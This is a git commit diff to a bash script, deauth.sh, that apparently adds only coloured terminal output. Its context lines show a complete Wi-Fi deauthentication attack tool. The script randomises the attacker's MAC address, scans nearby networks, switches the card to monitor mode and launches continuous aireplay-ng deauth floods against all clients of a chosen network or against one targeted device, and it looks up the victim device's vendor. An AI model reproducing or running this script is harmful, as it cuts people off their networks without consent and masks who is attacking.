cab25d7d7bedba3120a4af68efaa138420f1c104
EMLGaming <ezrah@ligthartschenk.com>
2017-05-16 17:20:40 +0200

    Add files via upload

--- deauth.sh
+++ deauth.sh
@@ -7,11 +7,11 @@
 # and moose you can thank me for this it took quite long xD
 
 
-echo "this script is for da m00seman so we gotta go fast af boii"
+echo -e "\e[36mthis script is for da m00seman so we gotta go fast af boii"
 sleep 1
 clear
 iwconfig
-echo "type your wireless card name:"
+echo -e "\e[31mtype your wireless card name:\e[36m"
 read wire
 ifconfig $wire down
 macchanger -r $wire
@@ -21,18 +21,18 @@ clear
 echo "it is now scanning networks so this takes a little bit"
 sleep 5
 iw dev $wire scan | egrep "SSID|primary channel"
-echo "type the name of the network:"
+echo -e "\e[31mtype the name of the network:\e[36m"
 read name
-echo "and the channel:"
+echo -e "\e[31mand the channel:\e[36m"
 read channel
 airmon-ng start $wire
 airmon-ng check kill
 clear	
 
-echo "would you like to deauth:"
-echo "1) all from the network"
-echo "2) a specific target"
-echo "type 1 or 2"
+echo -e "\e[31mwould you like to deauth:"
+echo -e "1) all from the network"
+echo -e "2) a specific target"
+echo -e "type 1 or 2\e[36m"
 read oneormore
 if [[ $oneormore == 1 ]]; then
 	
@@ -47,37 +47,37 @@ xterm -e "aireplay-ng -0 0 -e '$name' $wire""mon; read"
 
 else 
 
-	#iwconfig wlan0mon channel
-		# iwcoinfig wlan0mon up
 
 
 gnome-terminal -x sh -c "airodump-ng --essid '$name' -c $channel $wire""mon" 
 	echo " "
-	echo "would you like to lookup a targets device?"
-	echo "type yes or no"
+	echo -e "\e[31mwould you like to lookup a targets device?"
+	echo -e "type yes or no\e[36m"
 	read lookup
 		if [[ $lookup == yes ]]; then 
-			echo "type the first 6 characters of the station"
-			echo "don't type the ':' do only xxxxxx"
+			echo -e "\e[31mtype the first 6 characters of the station"
+			echo -e "don't type the ':' do only xxxxxx\e[36m"
 			read oui
 			grep -i $oui /usr/share/nmap/nmap-mac-prefixes
 
 		else
 				echo " "
 			fi		
-		echo "station of the target"
-		echo "but now make sure to type it like XX:00:XX:00:XX:00"
+		echo -e "\e[31mstation of the target"
+		echo -e "but now make sure to type it like XX:00:XX:00:XX:00\e[36m"
 		read station
-		echo "when you are done just close the window"
+		echo -e "when you are done just close the window"
 		xterm -e "aireplay-ng -0 0 -e '$name' -c '$station' $wire""mon; read"
 
 fi
 
-echo "press enter to get wireless card out of monitor mode!"
+echo -e "\e[31mpress enter to get wireless card out of monitor mode!\e[36m"
 read 
 airmon-ng stop $wire"mon"
 clear
-echo "DONE!!"
+echo -e "DONE!!"
+sleep 2
+clear
 # done!
 
 
